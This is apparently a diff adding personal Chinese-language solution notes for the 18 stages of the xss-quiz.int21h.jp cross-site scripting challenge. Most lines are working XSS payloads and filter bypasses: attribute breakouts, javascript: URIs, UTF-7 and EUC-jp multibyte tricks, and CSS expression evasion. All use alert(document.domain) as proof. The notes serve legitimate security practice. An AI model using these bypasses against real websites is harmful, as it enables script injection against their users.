@@ -1,0 +1,100 @@
+http://xss-quiz.int21h.jp
+第一关：<img onerror="alert(document.domain);" src=>
+第二关："><script>alert(document.domain);</script>
+
+第三关：
+http://xss-quiz.int21h.jp/stage-3.php?sid=93de7707279b3a5ae4ce419bfc7c0b1f380a20f6
+提示：The input in text box is properly escaped
+但是输入点就不仅这处。
+
+
+第四关：
+http://xss-quiz.int21h.jp/stage_4.php?sid=a311bc75ede604bb9d9d1cf566117401218f789c
+hidden的input输入点：" onmouseover="alert(document.domain);" type="text 这不行:(
+"><script>alert(document.domain);</script> 这样
+
+第五关：
+http://xss-quiz.int21h.jp/stage--5.php?sid=646d0cc8a8f21e2e32b36910462f1fcf8513a60d
+" onmouseover="alert(document.domain);" type="text可行，tamper data代理下绕过客户端长度限制。
+
+第六关：
+http://xss-quiz.int21h.jp/stage-no6.php?sid=521453f94fdb4c3e538b27cca9f1cc771edc0b1a
+" onmouseover="alert(document.domain);" x="还是一样。。
+
+第七关：
+http://xss-quiz.int21h.jp/stage07.php?sid=fc33ef87ee482ad559e828f80803a9645ea2cc19
+1 onmouseover=alert(document.domain);这个过滤变法有点意思了
+
+第八关：
+http://xss-quiz.int21h.jp/stage008.php?sid=b2d11d0122ac031aefde2490f623af51c6dc4af4
+javascript:alert(document.domain); //js伪协议的了
+
+第九关：
+http://xss-quiz.int21h.jp/stage_09.php?sid=5b3848609d2b7d7eaa76b3c2fe1107b4e027f441
++ACI- onmouseover=+ACI-alert(document.domain)+ADsAIg- x=+ACI-
+utf-7
+实际测试：+编码为%2b
+p1=1%2bACI- onmouseover=%2bACI-alert(document.domain)%2bADsAIg- x=%2bACI-&charset=euc-jp
+
+第十关：
+http://xss-quiz.int21h.jp/stage00010.php?sid=ebbdd5208bce92c3c26c5da4e79c3a0086f16d5e
+提示：s/domain//g; 
+" onmouseover=alert(document.domdomainain); x="
+
+第十一关：
+http://xss-quiz.int21h.jp/stage11th.php?sid=2ea843cedd78f5b9dfd684cc00be42481f72449c
+提示："s/script/xscript/ig;" and "s/on[a-z]+=/onxxx=/ig;" and "s/style=/stxxx=/ig;" 
+"><iframe src="javascr&#09;ipt:alert(document.domain);"></iframe>这样是可以的，但是没给我下一关。
+"><a href="javascr&#09;ipt:alert(document.domain);">12</a>下一关……
+
+第十二关：
+http://xss-quiz.int21h.jp/stage_no012.php?sid=62c192a540aba87e7b6796ce0cbc2cd93fcb0750
+提示："s/[\x00-\x20\<\>\"\']//g;" 
+``onmouseover=alert(document.domain);下一关……
+
+第十三关：
+http://xss-quiz.int21h.jp/stage13_0.php?sid=00696ab8c69d8a146bc35d5e65b6a7c270eaf1f0
+background-color:#f00;background:url("javascript:alert(document.domain);");
+
+第十四关：
+http://xss-quiz.int21h.jp/stage-_-14.php?sid=7188bd9374f7397e0a67044cfcf721c6be036b83
+提示：s/(url|script|eval|expression)/xxx/ig
+cos:expres/**/sion(if(!window.x){alert(document.domain);window.x=1;})
+
+第十五关：
+http://xss-quiz.int21h.jp/stage__15.php?sid=26ac2a0522c04a788c217fd8d7847aab1626f726
+提示：document.write(); 
+\x3cscript\x3ealert(document.domain);\x3c/script\x3e
+
+第十六关：
+http://xss-quiz.int21h.jp/stage00000016.php?sid=f4aed769ab48312e8815f3b63f32e2984a4ebb88
+提示："document.write();" and "s/\\x/\\\\x/ig;" 
+\u003cscript\u003ealert(document.domain);\u003c/script\u003e
+用十进制也可以。\74script\76这样
+
+第十七关：
+http://xss-quiz.int21h.jp/stage-No17.php?sid=86908f4e2c28923d9280baebd67f4d9f009b5fa5
+提示：multi-byte character
+euc-jp的编码范围：
+byte 1為8E時, 為2 byte編碼, byte 2範圍為A1-DF
+byte 1範圍為A1-FE時, 為2 byte編碼, byte 2範圍為A1-FE
+byte 1為8F時為3 byte編碼, byte 2與byte 3範圍均為A1-FE
+两个表单元素都提交%A7闭合最后的双引号，查看源码成功了，为什么UI上去没成功？无奈直接在地址栏：javascript:alert(document.domain);
+现在发现原来是浏览器版本问题，别用IE8了过这个。
+p1=1%A7&p2=+onmouseover%3Dalert%28document.domain%29%3B+%A7
+
+第十八关：
+http://xss-quiz.int21h.jp/stage__No18.php?sid=e9cd87a31a1b373f6283b698f3762758db319f2b
+提示：us-ascii high bit issue 
+41-5A, 61-7A (若含數字與符號，則為21-7E)
+同样别用IE8，这些漏洞已经在IE8中修补了。
+p1=%A2%BE%BCscript%BEalert(document.domain);%BC/script%BE
+
+
+
+
+
+
+
+
+
